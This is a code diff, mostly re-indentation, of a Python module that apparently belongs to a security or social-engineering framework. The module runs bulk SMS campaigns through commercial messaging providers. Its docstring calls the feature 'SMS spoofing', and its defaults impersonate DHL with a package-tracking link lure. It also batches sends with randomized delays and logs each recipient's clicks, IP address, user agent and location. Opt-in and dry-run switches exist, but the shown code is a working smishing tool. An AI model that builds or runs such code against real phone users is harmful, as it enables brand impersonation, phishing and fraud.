-        config['auto_followup'] = self.module_options.get('auto_followup', 'false').lower() == 'true'
-        config['smart_timing'] = self.module_options.get('smart_timing', 'false').lower() == 'true'
-        
-        return config
-
-    def _display_sms_config(self, config):
-        """Display SMS configuration in a professional format"""
-        print(f"{Fore.CYAN}{'=' * 70}")
-        print(f"  CAMPAIGN CONFIGURATION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        # Provider Configuration
-        print(f"{Fore.YELLOW}  Provider Settings:{Style.RESET_ALL}")
-        print(f"    • Provider:        {Fore.WHITE}{config['provider'].upper()}{Style.RESET_ALL}")
-        print(f"    • Sender:          {Fore.WHITE}{config['sender']}{Style.RESET_ALL}")
-        if config['sender_number']:
-            print(f"    • Sender Number:   {Fore.WHITE}{config['sender_number']}{Style.RESET_ALL}")
-        
-        # Message Configuration
-        print(f"\n{Fore.YELLOW}  Message Configuration:{Style.RESET_ALL}")
-        print(f"    • Template:        {Fore.WHITE}{config['template']}{Style.RESET_ALL}")
-        print(f"    • Type:            {Fore.WHITE}{config['message_type']}{Style.RESET_ALL}")
-        print(f"    • Encoding:        {Fore.WHITE}{config['encoding']}{Style.RESET_ALL}")
-        if config['flash_sms']:
-            print(f"    • Flash SMS:       {Fore.GREEN}Enabled{Style.RESET_ALL}")
-        
-        # Campaign Settings
-        print(f"\n{Fore.YELLOW}  Campaign Settings:{Style.RESET_ALL}")
-        print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
-        print(f"    • Targets File:    {Fore.WHITE}{config['targets']}{Style.RESET_ALL}")
-        print(f"    • Batch Size:      {Fore.WHITE}{config['batch_size']}{Style.RESET_ALL}")
-        print(f"    • Delay:           {Fore.WHITE}{config['delay']}s{Style.RESET_ALL}")
-        if config['randomize_delay']:
-            print(f"    • Random Delay:    {Fore.GREEN}Enabled{Style.RESET_ALL}")
-        
-        # Rate Limiting
-        print(f"\n{Fore.YELLOW}  Rate Limiting:{Style.RESET_ALL}")
-        print(f"    • Messages/sec:    {Fore.WHITE}{config['rate_limit']}{Style.RESET_ALL}")
-        print(f"    • Daily Limit:     {Fore.WHITE}{config['daily_limit']}{Style.RESET_ALL}")
-        print(f"    • Per Number:      {Fore.WHITE}{config['per_number_limit']}{Style.RESET_ALL}")
-        
-        # Security & Compliance
-        security_features = []
-        if config['require_opt_in']: security_features.append("Opt-in Check")
-        if config['audit_log']: security_features.append("Audit Logging")
-        if config['gdpr_compliant']: security_features.append("GDPR Compliant")
-        if config['dry_run']: security_features.append("DRY RUN MODE")
-        
-        if security_features:
-            print(f"\n{Fore.YELLOW}  Security & Compliance:{Style.RESET_ALL}")
-            print(f"    • {Fore.WHITE}{', '.join(security_features)}{Style.RESET_ALL}")
-        
-        # Advanced Features
-        advanced_features = []
-        if config['multi_phase']: advanced_features.append("Multi-phase Campaign")
-        if config['a_b_testing']: advanced_features.append("A/B Testing")
-        if config['smart_timing']: advanced_features.append("Smart Timing")
-        if config['auto_followup']: advanced_features.append("Auto Follow-up")
-        
-        if advanced_features:
-            print(f"\n{Fore.YELLOW}  Advanced Features:{Style.RESET_ALL}")
-            print(f"    • {Fore.WHITE}{', '.join(advanced_features)}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")
-
-    def _initialize_sms_database(self, config):
-        """Initialize SQLite database for SMS campaign tracking"""
-        import sqlite3
-        import time
-        
-        try:
-            timestamp = int(time.time())
-            db_name = config['db_file']
-            if not db_name.endswith('.db'):
-                db_name = f"{config['campaign_name']}_{timestamp}.db"
             
-            conn = sqlite3.connect(db_name)
-            cursor = conn.cursor()
+            print(f"\n{Fore.GREEN}✓ Campaign completed successfully{Style.RESET_ALL}\n")
+    
+        def _load_sms_config(self):
+            """Load and validate SMS spoofing configuration with defaults"""
+            config = {}
             
-            # Create campaigns table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS campaigns (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    name TEXT NOT NULL,
-                    provider TEXT NOT NULL,
-                    sender TEXT,
-                    message_template TEXT,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    started_at TIMESTAMP,
-                    completed_at TIMESTAMP,
-                    status TEXT DEFAULT 'initialized',
-                    total_targets INTEGER,
-                    total_sent INTEGER DEFAULT 0,
-                    total_delivered INTEGER DEFAULT 0,
-                    total_failed INTEGER DEFAULT 0,
-                    total_clicks INTEGER DEFAULT 0,
-                    cost_estimate REAL DEFAULT 0.0
-                )
-            """)
+            # Provider Configuration
+            config['provider'] = self.module_options.get('provider', 'twilio').lower()
+            config['twilio_sid'] = self.module_options.get('twilio_sid', '')
+            config['twilio_token'] = self.module_options.get('twilio_token', '')
+            config['twilio_number'] = self.module_options.get('twilio_number', '')
+            config['vonage_api_key'] = self.module_options.get('vonage_api_key', '')
+            config['vonage_api_secret'] = self.module_options.get('vonage_api_secret', '')
+            config['vonage_number'] = self.module_options.get('vonage_number', '')
+            config['aws_access_key'] = self.module_options.get('aws_access_key', '')
+            config['aws_secret_key'] = self.module_options.get('aws_secret_key', '')
+            config['aws_region'] = self.module_options.get('aws_region', 'us-east-1')
             
-            # Create messages table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS messages (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER,
-                    phone_number TEXT NOT NULL,
-                    recipient_name TEXT,
-                    message_content TEXT,
-                    message_sid TEXT,
-                    status TEXT DEFAULT 'pending',
-                    sent_at TIMESTAMP,
-                    delivered_at TIMESTAMP,
-                    error_message TEXT,
-                    retry_count INTEGER DEFAULT 0,
-                    cost REAL DEFAULT 0.0,
-                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-                )
-            """)
+            # Message Configuration
+            config['message'] = self.module_options.get('message', 'Your package is ready. Track: {link}')
+            config['sender'] = self.module_options.get('sender', 'DHL')
+            config['sender_number'] = self.module_options.get('sender_number', '')
+            config['message_type'] = self.module_options.get('message_type', 'promotional')
+            config['encoding'] = self.module_options.get('encoding', 'auto')
+            config['flash_sms'] = self.module_options.get('flash_sms', 'false').lower() == 'true'
+            config['validity_period'] = int(self.module_options.get('validity_period', '72'))
             
-            # Create clicks table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS clicks (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    message_id INTEGER,
-                    clicked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    ip_address TEXT,
-                    user_agent TEXT,
-                    country TEXT,
-                    city TEXT,
-                    FOREIGN KEY (message_id) REFERENCES messages(id)
-                )
-            """)
+            # Campaign Configuration
+            config['campaign_name'] = self.module_options.get('campaign_name', 'sms_campaign')
+            config['targets'] = self.module_options.get('targets', 'phones.txt')
+            config['max_targets'] = int(self.module_options.get('max_targets', '1000'))
+            config['batch_size'] = int(self.module_options.get('batch_size', '50'))
+            config['delay'] = float(self.module_options.get('delay', '2'))
+            config['batch_delay'] = int(self.module_options.get('batch_delay', '60'))
+            config['randomize_delay'] = self.module_options.get('randomize_delay', 'true').lower() == 'true'
+            config['retry_failed'] = self.module_options.get('retry_failed', 'true').lower() == 'true'
+            config['max_retries'] = int(self.module_options.get('max_retries', '3'))
             
-            # Create replies table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS replies (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    message_id INTEGER,
-                    reply_content TEXT,
-                    replied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    sentiment TEXT,
-                    FOREIGN KEY (message_id) REFERENCES messages(id)
-                )
-            """)
+            # Personalization & Templates
+            config['template'] = self.module_options.get('template', 'custom')
+            config['link'] = self.module_options.get('link', 'http://track.example.com/123')
+            config['link_shortener'] = self.module_options.get('link_shortener', 'none')
+            config['bitly_token'] = self.module_options.get('bitly_token', '')
+            config['personalize'] = self.module_options.get('personalize', 'true').lower() == 'true'
+            config['randomize_content'] = self.module_options.get('randomize_content', 'false').lower() == 'true'
             
-            # Create blacklist table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS blacklist (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    phone_number TEXT UNIQUE NOT NULL,
-                    reason TEXT,
-                    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
+            # Scheduling
+            config['schedule'] = self.module_options.get('schedule', 'now')
+            config['timezone'] = self.module_options.get('timezone', 'UTC')
+            config['business_hours_only'] = self.module_options.get('business_hours_only', 'false').lower() == 'true'
+            config['respect_dnd'] = self.module_options.get('respect_dnd', 'true').lower() == 'true'
             
-            # Create opt_ins table
-            cursor.execute("""
-                CREATE TABLE IF NOT EXISTS opt_ins (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    phone_number TEXT UNIQUE NOT NULL,
-                    opted_in_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    source TEXT
-                )
-            """)
+            # Tracking & Analytics
+            config['track_delivery'] = self.module_options.get('track_delivery', 'true').lower() == 'true'
+            config['track_clicks'] = self.module_options.get('track_clicks', 'true').lower() == 'true'
+            config['track_replies'] = self.module_options.get('track_replies', 'false').lower() == 'true'
+            config['webhook_url'] = self.module_options.get('webhook_url', '')
+            config['db_file'] = self.module_options.get('db_file', 'sms_campaign.db')
+            config['log_file'] = self.module_options.get('log_file', 'sms_campaign.log')
             
-            # Insert campaign record
-            cursor.execute("""
-                INSERT INTO campaigns (name, provider, sender, message_template, status)
-                VALUES (?, ?, ?, ?, 'initialized')
-            """, (
-                config['campaign_name'],
-                config['provider'],
-                config['sender'],
-                config['message']
-            ))
+            # Rate Limiting & Throttling
+            config['rate_limit'] = int(self.module_options.get('rate_limit', '10'))
+            config['daily_limit'] = int(self.module_options.get('daily_limit', '1000'))
+            config['per_number_limit'] = int(self.module_options.get('per_number_limit', '5'))
+            config['adaptive_throttle'] = self.module_options.get('adaptive_throttle', 'true').lower() == 'true'
             
-            conn.commit()
-            print(f"{Fore.GREEN}✓ Database initialized: {db_name}{Style.RESET_ALL}")
-            return conn
+            # Security & Compliance
+            config['require_opt_in'] = self.module_options.get('require_opt_in', 'true').lower() == 'true'
+            config['opt_in_file'] = self.module_options.get('opt_in_file', 'opt_ins.txt')
+            config['blacklist_file'] = self.module_options.get('blacklist_file', 'blacklist.txt')
+            config['dry_run'] = self.module_options.get('dry_run', 'false').lower() == 'true'
+            config['audit_log'] = self.module_options.get('audit_log', 'true').lower() == 'true'
+            config['encrypt_db'] = self.module_options.get('encrypt_db', 'false').lower() == 'true'
+            config['gdpr_compliant'] = self.module_options.get('gdpr_compliant', 'true').lower() == 'true'
             
-        except Exception as e:
-            print(f"{Fore.RED}✗ ERROR: Database initialization failed: {str(e)}{Style.RESET_ALL}")
-            return None
-
-    def _validate_sms_provider(self, config):
-        """Validate SMS provider credentials and connectivity"""
-        provider = config['provider']
-        
-        print(f"{Fore.CYAN}→ Validating {provider.upper()} provider...{Style.RESET_ALL}")
-        
-        if provider == 'twilio':
-            if not config['twilio_sid'] or not config['twilio_token'] or not config['twilio_number']:
-                print(f"{Fore.RED}✗ ERROR: Twilio credentials missing{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ Required: twilio_sid, twilio_token, twilio_number{Style.RESET_ALL}")
-                return False
+            # Output & Reporting
+            config['output_format'] = self.module_options.get('output_format', 'all')
+            config['report_file'] = self.module_options.get('report_file', 'sms_report')
+            config['real_time_stats'] = self.module_options.get('real_time_stats', 'true').lower() == 'true'
+            config['export_failed'] = self.module_options.get('export_failed', 'true').lower() == 'true'
+            config['generate_dashboard'] = self.module_options.get('generate_dashboard', 'true').lower() == 'true'
             
-            # Try to import Twilio
+            # Advanced Features
+            config['multi_phase'] = self.module_options.get('multi_phase', 'false').lower() == 'true'
+            config['phase_delay'] = int(self.module_options.get('phase_delay', '24'))
+            config['a_b_testing'] = self.module_options.get('a_b_testing', 'false').lower() == 'true'
+            config['sentiment_analysis'] = self.module_options.get('sentiment_analysis', 'false').lower() == 'true'
+            config['auto_followup'] = self.module_options.get('auto_followup', 'false').lower() == 'true'
+            config['smart_timing'] = self.module_options.get('smart_timing', 'false').lower() == 'true'
+            
+            return config
+    
+        def _display_sms_config(self, config):
+            """Display SMS configuration in a professional format"""
+            print(f"{Fore.CYAN}{'=' * 70}")
+            print(f"  CAMPAIGN CONFIGURATION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            # Provider Configuration
+            print(f"{Fore.YELLOW}  Provider Settings:{Style.RESET_ALL}")
+            print(f"    • Provider:        {Fore.WHITE}{config['provider'].upper()}{Style.RESET_ALL}")
+            print(f"    • Sender:          {Fore.WHITE}{config['sender']}{Style.RESET_ALL}")
+            if config['sender_number']:
+                print(f"    • Sender Number:   {Fore.WHITE}{config['sender_number']}{Style.RESET_ALL}")
+            
+            # Message Configuration
+            print(f"\n{Fore.YELLOW}  Message Configuration:{Style.RESET_ALL}")
+            print(f"    • Template:        {Fore.WHITE}{config['template']}{Style.RESET_ALL}")
+            print(f"    • Type:            {Fore.WHITE}{config['message_type']}{Style.RESET_ALL}")
+            print(f"    • Encoding:        {Fore.WHITE}{config['encoding']}{Style.RESET_ALL}")
+            if config['flash_sms']:
+                print(f"    • Flash SMS:       {Fore.GREEN}Enabled{Style.RESET_ALL}")
+            
+            # Campaign Settings
+            print(f"\n{Fore.YELLOW}  Campaign Settings:{Style.RESET_ALL}")
+            print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
+            print(f"    • Targets File:    {Fore.WHITE}{config['targets']}{Style.RESET_ALL}")
+            print(f"    • Batch Size:      {Fore.WHITE}{config['batch_size']}{Style.RESET_ALL}")
+            print(f"    • Delay:           {Fore.WHITE}{config['delay']}s{Style.RESET_ALL}")
+            if config['randomize_delay']:
+                print(f"    • Random Delay:    {Fore.GREEN}Enabled{Style.RESET_ALL}")
+            
+            # Rate Limiting
+            print(f"\n{Fore.YELLOW}  Rate Limiting:{Style.RESET_ALL}")
+            print(f"    • Messages/sec:    {Fore.WHITE}{config['rate_limit']}{Style.RESET_ALL}")
+            print(f"    • Daily Limit:     {Fore.WHITE}{config['daily_limit']}{Style.RESET_ALL}")
+            print(f"    • Per Number:      {Fore.WHITE}{config['per_number_limit']}{Style.RESET_ALL}")
+            
+            # Security & Compliance
+            security_features = []
+            if config['require_opt_in']: security_features.append("Opt-in Check")
+            if config['audit_log']: security_features.append("Audit Logging")
+            if config['gdpr_compliant']: security_features.append("GDPR Compliant")
+            if config['dry_run']: security_features.append("DRY RUN MODE")
+            
+            if security_features:
+                print(f"\n{Fore.YELLOW}  Security & Compliance:{Style.RESET_ALL}")
+                print(f"    • {Fore.WHITE}{', '.join(security_features)}{Style.RESET_ALL}")
+            
+            # Advanced Features
+            advanced_features = []
+            if config['multi_phase']: advanced_features.append("Multi-phase Campaign")
+            if config['a_b_testing']: advanced_features.append("A/B Testing")
+            if config['smart_timing']: advanced_features.append("Smart Timing")
+            if config['auto_followup']: advanced_features.append("Auto Follow-up")
+            
+            if advanced_features:
+                print(f"\n{Fore.YELLOW}  Advanced Features:{Style.RESET_ALL}")
+                print(f"    • {Fore.WHITE}{', '.join(advanced_features)}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")
+    
+        def _initialize_sms_database(self, config):
+            """Initialize SQLite database for SMS campaign tracking"""
+            import sqlite3
+            import time
+            
             try:
-                from twilio.rest import Client
-                # Test credentials (this will make a small API call)
-                client = Client(config['twilio_sid'], config['twilio_token'])
-                # Validate the number
-                try:
-                    account = client.api.accounts(config['twilio_sid']).fetch()
-                    print(f"{Fore.GREEN}✓ Twilio credentials validated{Style.RESET_ALL}")
-                    print(f"{Fore.GREEN}✓ Account: {account.friendly_name}{Style.RESET_ALL}")
-                    return True
-                except Exception as e:
-                    print(f"{Fore.RED}✗ ERROR: Invalid Twilio credentials: {str(e)}{Style.RESET_ALL}")
+                timestamp = int(time.time())
+                db_name = config['db_file']
+                if not db_name.endswith('.db'):
+                    db_name = f"{config['campaign_name']}_{timestamp}.db"
+                
+                conn = sqlite3.connect(db_name)
+                cursor = conn.cursor()
+                
+                # Create campaigns table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS campaigns (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        name TEXT NOT NULL,
+                        provider TEXT NOT NULL,
+                        sender TEXT,
+                        message_template TEXT,
+                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        started_at TIMESTAMP,
+                        completed_at TIMESTAMP,
+                        status TEXT DEFAULT 'initialized',
+                        total_targets INTEGER,
+                        total_sent INTEGER DEFAULT 0,
+                        total_delivered INTEGER DEFAULT 0,
+                        total_failed INTEGER DEFAULT 0,
+                        total_clicks INTEGER DEFAULT 0,
+                        cost_estimate REAL DEFAULT 0.0
+                    )
+                """)
+                
+                # Create messages table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS messages (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER,
+                        phone_number TEXT NOT NULL,
+                        recipient_name TEXT,
+                        message_content TEXT,
+                        message_sid TEXT,
+                        status TEXT DEFAULT 'pending',
+                        sent_at TIMESTAMP,
+                        delivered_at TIMESTAMP,
+                        error_message TEXT,
+                        retry_count INTEGER DEFAULT 0,
+                        cost REAL DEFAULT 0.0,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                """)
+                
+                # Create clicks table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS clicks (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        message_id INTEGER,
+                        clicked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        ip_address TEXT,
+                        user_agent TEXT,
+                        country TEXT,
+                        city TEXT,
+                        FOREIGN KEY (message_id) REFERENCES messages(id)
+                    )
+                """)
+                
+                # Create replies table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS replies (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        message_id INTEGER,
+                        reply_content TEXT,
+                        replied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        sentiment TEXT,
+                        FOREIGN KEY (message_id) REFERENCES messages(id)
+                    )
+                """)
+                
+                # Create blacklist table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS blacklist (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        phone_number TEXT UNIQUE NOT NULL,
+                        reason TEXT,
+                        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                """)
+                
+                # Create opt_ins table
+                cursor.execute("""
+                    CREATE TABLE IF NOT EXISTS opt_ins (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        phone_number TEXT UNIQUE NOT NULL,
+                        opted_in_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        source TEXT
+                    )
+                """)
+                
+                # Insert campaign record
+                cursor.execute("""
+                    INSERT INTO campaigns (name, provider, sender, message_template, status)
+                    VALUES (?, ?, ?, ?, 'initialized')
+                """, (
+                    config['campaign_name'],
+                    config['provider'],
+                    config['sender'],
+                    config['message']
+                ))
+                
+                conn.commit()
+                print(f"{Fore.GREEN}✓ Database initialized: {db_name}{Style.RESET_ALL}")
+                return conn
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ ERROR: Database initialization failed: {str(e)}{Style.RESET_ALL}")
+                return None
+    
+        def _validate_sms_provider(self, config):
+            """Validate SMS provider credentials and connectivity"""
+            provider = config['provider']
+            
+            print(f"{Fore.CYAN}→ Validating {provider.upper()} provider...{Style.RESET_ALL}")
+            
+            if provider == 'twilio':
+                if not config['twilio_sid'] or not config['twilio_token'] or not config['twilio_number']:
+                    print(f"{Fore.RED}✗ ERROR: Twilio credentials missing{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}ℹ Required: twilio_sid, twilio_token, twilio_number{Style.RESET_ALL}")
                     return False
-            except ImportError:
-                print(f"{Fore.YELLOW}⚠ WARNING: Twilio library not installed{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ Install with: pip install twilio{Style.RESET_ALL}")
-                return False
                 
-        elif provider == 'vonage':
-            if not config['vonage_api_key'] or not config['vonage_api_secret']:
-                print(f"{Fore.RED}✗ ERROR: Vonage credentials missing{Style.RESET_ALL}")
-                return False
-            print(f"{Fore.GREEN}✓ Vonage credentials configured{Style.RESET_ALL}")
-            return True
+                # Try to import Twilio
+                try:
+                    from twilio.rest import Client
+                    # Test credentials (this will make a small API call)
+                    client = Client(config['twilio_sid'], config['twilio_token'])
+                    # Validate the number
+                    try:
+                        account = client.api.accounts(config['twilio_sid']).fetch()
+                        print(f"{Fore.GREEN}✓ Twilio credentials validated{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}✓ Account: {account.friendly_name}{Style.RESET_ALL}")
+                        return True
+                    except Exception as e:
+                        print(f"{Fore.RED}✗ ERROR: Invalid Twilio credentials: {str(e)}{Style.RESET_ALL}")
+                        return False
+                except ImportError:
+                    print(f"{Fore.YELLOW}⚠ WARNING: Twilio library not installed{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}ℹ Install with: pip install twilio{Style.RESET_ALL}")
+                    return False
+                    
+            elif provider == 'vonage':
+                if not config['vonage_api_key'] or not config['vonage_api_secret']:
+                    print(f"{Fore.RED}✗ ERROR: Vonage credentials missing{Style.RESET_ALL}")
+                    return False
+                print(f"{Fore.GREEN}✓ Vonage credentials configured{Style.RESET_ALL}")
+                return True
+                
+            elif provider == 'aws_sns':
+                if not config['aws_access_key'] or not config['aws_secret_key']:
+                    print(f"{Fore.RED}✗ ERROR: AWS credentials missing{Style.RESET_ALL}")
+                    return False
+                print(f"{Fore.GREEN}✓ AWS SNS credentials configured{Style.RESET_ALL}")
+                return True
+                
+            elif provider == 'manual':
+                print(f"{Fore.YELLOW}⚠ Manual mode - no provider validation{Style.RESET_ALL}")
+                return True
             
-        elif provider == 'aws_sns':
-            if not config['aws_access_key'] or not config['aws_secret_key']:
-                print(f"{Fore.RED}✗ ERROR: AWS credentials missing{Style.RESET_ALL}")
-                return False
-            print(f"{Fore.GREEN}✓ AWS SNS credentials configured{Style.RESET_ALL}")
-            return True
+            else:
+                print(f"{Fore.YELLOW}⚠ WARNING: Unknown provider '{provider}'{Style.RESET_ALL}")
+                return True
+    
+        def _load_sms_targets(self, config):
+            """Load, validate, and filter SMS targets from file"""
+            import re
             
-        elif provider == 'manual':
-            print(f"{Fore.YELLOW}⚠ Manual mode - no provider validation{Style.RESET_ALL}")
-            return True
-        
-        else:
-            print(f"{Fore.YELLOW}⚠ WARNING: Unknown provider '{provider}'{Style.RESET_ALL}")
-            return True
-
-    def _load_sms_targets(self, config):
-        """Load, validate, and filter SMS targets from file"""
-        import re
-        
-        targets_file = config['targets']
-        
-        if not os.path.exists(targets_file):
-            print(f"{Fore.YELLOW}⚠ WARNING: Targets file not found. Creating example...{Style.RESET_ALL}")
-            with open(targets_file, 'w') as f:
-                f.write("# SMS Campaign Targets\n")
-                f.write("# Format: phone_number,name,country,opt_in_status\n")
-                f.write("+1234567890,John Doe,US,yes\n")
-                f.write("+0987654321,Jane Smith,UK,yes\n")
-                f.write("+4412345678,Alice Brown,UK,yes\n")
-            print(f"{Fore.GREEN}✓ Created example file: {targets_file}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ Edit the file and run again{Style.RESET_ALL}")
-            return []
-        
-        # Load blacklist
-        blacklist = set()
-        if os.path.exists(config['blacklist_file']):
-            with open(config['blacklist_file'], 'r') as f:
-                for line in f:
+            targets_file = config['targets']
+            
+            if not os.path.exists(targets_file):
+                print(f"{Fore.YELLOW}⚠ WARNING: Targets file not found. Creating example...{Style.RESET_ALL}")
+                with open(targets_file, 'w') as f:
+                    f.write("# SMS Campaign Targets\n")
+                    f.write("# Format: phone_number,name,country,opt_in_status\n")
+                    f.write("+1234567890,John Doe,US,yes\n")
+                    f.write("+0987654321,Jane Smith,UK,yes\n")
+                    f.write("+4412345678,Alice Brown,UK,yes\n")
+                print(f"{Fore.GREEN}✓ Created example file: {targets_file}{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Edit the file and run again{Style.RESET_ALL}")
+                return []
+            
+            # Load blacklist
+            blacklist = set()
+            if os.path.exists(config['blacklist_file']):
+                with open(config['blacklist_file'], 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            blacklist.add(self._normalize_phone_number(line))
+            
+            # Load opt-ins
+            opt_ins = set()
+            if config['require_opt_in'] and os.path.exists(config['opt_in_file']):
+                with open(config['opt_in_file'], 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            opt_ins.add(self._normalize_phone_number(line))
+            
+            # Load targets
+            targets = []
+            valid_count = 0
+            invalid_count = 0
+            blacklisted_count = 0
+            no_opt_in_count = 0
+            
+            with open(targets_file, 'r') as f:
+                for line_num, line in enumerate(f, 1):
                     line = line.strip()
-                    if line and not line.startswith('#'):
-                        blacklist.add(self._normalize_phone_number(line))
-        
-        # Load opt-ins
-        opt_ins = set()
-        if config['require_opt_in'] and os.path.exists(config['opt_in_file']):
-            with open(config['opt_in_file'], 'r') as f:
-                for line in f:
-                    line = line.strip()
-                    if line and not line.startswith('#'):
-                        opt_ins.add(self._normalize_phone_number(line))
-        
-        # Load targets
-        targets = []
-        valid_count = 0
-        invalid_count = 0
-        blacklisted_count = 0
-        no_opt_in_count = 0
-        
-        with open(targets_file, 'r') as f:
-            for line_num, line in enumerate(f, 1):
-                line = line.strip()
-                if not line or line.startswith('#'):
-                    continue
-                
-                parts = [p.strip() for p in line.split(',')]
-                if len(parts) < 1:
-                    continue
-                
-                phone = parts[0]
-                name = parts[1] if len(parts) > 1 else 'User'
-                country = parts[2] if len(parts) > 2 else ''
-                opt_in_status = parts[3].lower() if len(parts) > 3 else 'unknown'
-                
-                # Normalize and validate phone number
-                normalized_phone = self._normalize_phone_number(phone)
-                if not self._validate_phone_number(normalized_phone):
-                    invalid_count += 1
-                    continue
-                
-                # Check blacklist
-                if normalized_phone in blacklist:
-                    blacklisted_count += 1
-                    continue
-                
-                # Check opt-in if required
-                if config['require_opt_in']:
-                    if normalized_phone not in opt_ins and opt_in_status != 'yes':
-                        no_opt_in_count += 1
+                    if not line or line.startswith('#'):
                         continue
-                
-                targets.append({
-                    'phone': normalized_phone,
-                    'name': name,
-                    'country': country,
-                    'opt_in': opt_in_status == 'yes' or normalized_phone in opt_ins
-                })
-                valid_count += 1
-                
-                # Check max targets limit
-                if len(targets) >= config['max_targets']:
-                    print(f"{Fore.YELLOW}⚠ WARNING: Reached max targets limit ({config['max_targets']}){Style.RESET_ALL}")
+                    
+                    parts = [p.strip() for p in line.split(',')]
+                    if len(parts) < 1:
+                        continue
+                    
+                    phone = parts[0]
+                    name = parts[1] if len(parts) > 1 else 'User'
+                    country = parts[2] if len(parts) > 2 else ''
+                    opt_in_status = parts[3].lower() if len(parts) > 3 else 'unknown'
+                    
+                    # Normalize and validate phone number
+                    normalized_phone = self._normalize_phone_number(phone)
+                    if not self._validate_phone_number(normalized_phone):
+                        invalid_count += 1
+                        continue
+                    
+                    # Check blacklist
+                    if normalized_phone in blacklist:
+                        blacklisted_count += 1
+                        continue
+                    
+                    # Check opt-in if required
+                    if config['require_opt_in']:
+                        if normalized_phone not in opt_ins and opt_in_status != 'yes':
+                            no_opt_in_count += 1
+                            continue
+                    
+                    targets.append({
+                        'phone': normalized_phone,
+                        'name': name,
+                        'country': country,
+                        'opt_in': opt_in_status == 'yes' or normalized_phone in opt_ins
+                    })
+                    valid_count += 1
+                    
+                    # Check max targets limit
+                    if len(targets) >= config['max_targets']:
+                        print(f"{Fore.YELLOW}⚠ WARNING: Reached max targets limit ({config['max_targets']}){Style.RESET_ALL}")
+                        break
+            
+            # Display loading summary
+            print(f"\n{Fore.CYAN}Target Loading Summary:{Style.RESET_ALL}")
+            print(f"  • Valid:           {Fore.GREEN}{valid_count}{Style.RESET_ALL}")
+            if invalid_count > 0:
+                print(f"  • Invalid:         {Fore.RED}{invalid_count}{Style.RESET_ALL}")
+            if blacklisted_count > 0:
+                print(f"  • Blacklisted:     {Fore.YELLOW}{blacklisted_count}{Style.RESET_ALL}")
+            if no_opt_in_count > 0:
+                print(f"  • No Opt-in:       {Fore.YELLOW}{no_opt_in_count}{Style.RESET_ALL}")
+            print()
+            
+            return targets
+    
+        def _normalize_phone_number(self, phone):
+            """Normalize phone number to E.164 format"""
+            import re
+            # Remove all non-digit characters except +
+            phone = re.sub(r'[^\d+]', '', phone)
+            # Ensure it starts with +
+            if not phone.startswith('+'):
+                phone = '+' + phone
+            return phone
+    
+        def _validate_phone_number(self, phone):
+            """Validate phone number format (basic validation)"""
+            import re
+            # E.164 format: +[country code][number]
+            # Length: 7-15 digits (including country code)
+            pattern = r'^\+\d{7,15}$'
+            return bool(re.match(pattern, phone))
+    
+        def _dry_run_simulation(self, config, targets, db_conn):
+            """Simulate campaign execution without sending"""
+            import time
+            import random
+            
+            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
+            print(f"║                     DRY RUN SIMULATION                           ║")
+            print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}Simulating campaign for {len(targets)} target(s)...{Style.RESET_ALL}\n")
+            
+            # Simulate message generation
+            for i, target in enumerate(targets[:10], 1):  # Show first 10
+                message = self._personalize_message(config['message'], target, config)
